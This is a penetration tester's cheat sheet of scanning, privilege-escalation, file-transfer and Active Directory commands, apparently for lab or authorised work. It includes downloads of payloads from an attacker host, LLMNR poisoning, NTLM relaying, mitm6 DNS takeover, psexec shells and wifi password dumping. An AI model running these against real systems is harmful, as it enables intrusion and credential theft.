# scanning - nmap - initial scan
nmap -sC -sV -oA nmap/<NAME> 10.10.x.x #you can replace ip with '-iL targets.txt' if needed

# scanning - nmap - checking UDP ports
nmap -sU -oA nmap/<NAME>-udp 10.10.x.x

# scanning - nmap - all ports
nmap -sV -oA nmap/<NAME>-all-ports -p- 10.10.x.x

# scanning - gobuster - enumerate subdomains
gobuster vhost --url <NAME>.htb -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt

# scanning - dirb - enumerate directories
dirb http://<NAME>.htb -r -o <NAME>.dirb

# Python quick http server to host files for victims to pull down
python -m SimpleHTTPServer <port>
python3 -m http.server <port>

# Simple Netcat listener
nc -lvnp <port>

# create symbolic link (so github scripts can be called anywhere like apt packages)
ln -s source_file symbolic_link

# ssh proxy
ssh -i <key> -L<port to hit locally>:<RHOST>:<RPORT> <proxy ip>

# linux - privesc - find all SUID files and discard errors
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# windows - privesc - powershell check for world writable executables
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

# windows - privesc - powershell check for driver versions
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

# windows - privesc - check for whether non priviledged users can install updates
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

# windows - privesc - powershell check for interesting running services
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

# windows - privesc - check OS, version, architecture
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# windows - privesc - check for unquoted third party service paths
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# file transfer - scp - Copy file from a remote host to local host
scp username@from_host:file.txt /local/directory/

# file transfer - scp - Copy file from local host to a remote host
scp file.txt username@to_host:/remote/directory/

# file transfer - scp - Copy directory from a remote host to local host
scp -r username@from_host:/remote/directory/  /local/directory/

# file transfer - scp - Copy directory from local host to a remote host
scp -r /local/directory/ username@to_host:/remote/directory/

# file transfer - scp - Copy file from remote host to remote host
scp username@from_host:/remote/directory/file.txt username@to_host:/remote/directory/

# file transfer - powershell - pull files down on target
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>:8000/input.txt', 'output.txt')"

# file transfer - cmd - pull files down on target
certutil -urlcache -f http://<ATTACKER IP>/evilfile.exe evil.exe

# finding loot - dir - search windows filesystem for file
dir flag.txt /S /B
# and in powershell...
Get-Childitem –Path C:\ -Include *FLAG* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue

# finding loot - find - search linux filesystem for file
find / -type f -iname flag.txt 2>/dev/null

# OSINT - recon-ng - import list of names
1) Put names in first.last@example.com format:

sed 's/\s/./g' names.txt | sed 's/$/@example.com/g' > fname-dot-lname-emails.txt

2) Import email addresses into the recon-ng contacts table with import/list
3) Use the recon/contacts-contacts/unmangle module to populate the missing name fields from those email addresses
4) Run the mangle module to overwrite the original email addresses with a different format, like <first initial><last name>, eg. jdoe@example.com

# string manipulation - sed - stripping common suffixes
cat users.txt | sed -r 's/-md$|-do$|-cnp$|-aprn$|-crna$|-md-facog$|-dpm$|-md-pa$|-md-facs$//'

# string manipulation - sed - pulling a name list from a sitemap
grep provider xml-sitemap.html | cut -d '/' -f 6 | sed -r 's/-md$|-do$|-cnp$|-aprn$|-crna$|-md-facog$|-dpm$|-md-pa$|-md-facs$//' | sed 's/-/ /g'

# file transfer - vmware - mounting shared folder in guest after creating it in vmware
sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt -o allow_other

# search filters - wireshark - see wireless network names
(wlan.fc.type_subtype == 0x0008) or (wlan.fc.type_subtype == 0x0000) or (wlan.fc.type_subtype == 0x0005)

# file manipulation - remove duplicate lines
sort file.txt | uniq

# archiving - compress and archive every file in a directory (when you're in a directory that contains that directory)
tar -czvf interesting_files.tar.gz -C interesting_files .

# recon - internal - find devices on the local network
netdiscover -r <CIDR range>
arp-scan -l

# admin - note taking - initial set up - github and ssh
ssh-keygen -t ed25519 -C "name@example.com"
# copy ~/.ssh/id_ed25519.pub to https://github.com/settings/keys
ssh -T git@github.com
git clone git@github.com:v01dlight/public-tools.git
cd public-tools
git remote set-url origin git@github.com:v01dlight/public-tools.git
git config --global user.email "name@example.com"
git config --global user.name "Your Name"
gitter

# admin - initial setup - aliases
cp .bash_aliases ~
source ~/.bash_aliases
# to make aliases auto load on Kali
nano ~/.zshrc # append the following:
"""
# load custom aliases
if [ -f ~/.bash_aliases ]; then
        source ~/.bash_aliases
fi
"""

# admin - unzip a file
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# active directory - LLMNR poisoning - grabbing hashes with responder
sudo responder -I eth0 -rdw
cat /usr/share/responder/logs/SMB* > loot/[CLIENT].hashes

# active directory - pass the hash - relaying captured hashes through SMB
sudo nano /etc/responder/Responder.conf
# turn off SMB and HTTP
sudo responder -I eth0 -rdwv
# leave that running and open a new tab for the relay
impacket-ntlmrelayx -tf targets.txt -smb2support -i
# if successful an interactive SMB shell will be spawned, which we can connect to with netcat (or similar)
nc 127.0.0.1 11000
# we can likely get a full shell with those credentials through psexec
impacket-psexec [DOMAIN]/[USER]:[PASS]@[RHOST]

# active directory - IPv6 - DNS takeover with mitm6
sudo python3 mitm6.py -d [DOMAIN]
# we can relay captured credentials from that (usually triggered on a machine reboot) using ntlmrelayx
impacket-ntlmrelayx -6 -t ldaps://[DC IP] -wh fakewpad.[DOMAIN] -l enumeration

# finding loot - windows - wifi - grab wifi passwords
netsh wlan show profile
netsh wlan show profile <SSID> key=clear

# upgrade shell to fully interactive - python
python -c 'import pty;pty.spawn("/bin/bash");'
#CTRL+Z
stty raw -echo
fg # this will be invisible

# post exploitation - proof - moneyshot
whoami && id && hostname && ifconfig